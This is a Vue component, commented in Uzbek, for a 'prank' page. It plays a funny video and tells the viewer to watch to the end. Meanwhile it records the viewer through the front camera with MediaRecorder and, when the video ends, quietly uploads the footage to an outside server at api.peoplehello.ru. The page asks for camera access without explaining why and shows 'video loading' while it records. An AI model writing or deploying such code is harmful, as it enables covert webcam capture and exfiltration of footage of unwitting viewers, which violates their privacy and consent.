<script>
import axios from "axios"

export default {
  data() {
    return {
      stream: null,
      mediaRecorder: null,
      recordedChunks: [],
      recording: false,
    }
  },

  async mounted() {
    await this.requestCamera()
  },

  methods: {
    async requestCamera() {
      try {
        this.stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false // xohlasangiz true qilsak bo‘ladi
        })

        this.startRecording()

      } catch (e) {
        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
      }
    },

    startRecording() {
      this.recordedChunks = []

      // 🔻 Video hajmini kichraytirish (bitrate past)
      this.mediaRecorder = new MediaRecorder(this.stream, {
        mimeType: 'video/webm;codecs=vp8',
        videoBitsPerSecond: 700_000 // ~0.7 Mbps
      })

      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          this.recordedChunks.push(e.data)
        }
      }

      this.mediaRecorder.start()
      this.recording = true
    },

    async stopRecordingAndSend() {
      if (!this.mediaRecorder || !this.recording) return

      this.mediaRecorder.stop()
      this.recording = false

      this.mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(this.recordedChunks, {
          type: 'video/webm'
        })

        const formData = new FormData()
        formData.append('file', videoBlob)

        try {
          await axios.post(
              'https://api.peoplehello.ru/api/video-upload',
              formData
          )

          alert('😂 Video muvaffaqiyatli yuborildi!')

        } catch (e) {
          alert('❌ Video yuborishda xatolik')
        }
      }
    },

    onFunnyVideoEnd() {
      // 🎬 Kulgili video tugadi → recording ham tugaydi
      this.stopRecordingAndSend()
    }
  }
}
</script>

<template>
  <div class="prank-page">
    <!-- 😂 Kulgili video -->
    <video
        class="fun-video"
        autoplay
        playsinline
        muted
        @ended="onFunnyVideoEnd"
    >
      <source src="../assets/prank.mp4" type="video/mp4"/>
    </video>

    <div class="overlay">
      <h1>😂 Oxirgacha ko‘ring!</h1>
      <p>Video yuklanmoqda...</p>
    </div>
  </div>
</template>

<style>
.prank-page {
  position: relative;
  width: 100vw;
  height: 100vh;
  background: #000;
  overflow: hidden;
}

.fun-video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.overlay {
  position: absolute;
  inset: 0;
  background: rgba(0, 0, 0, 0.35);
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  text-align: center;
}
</style>
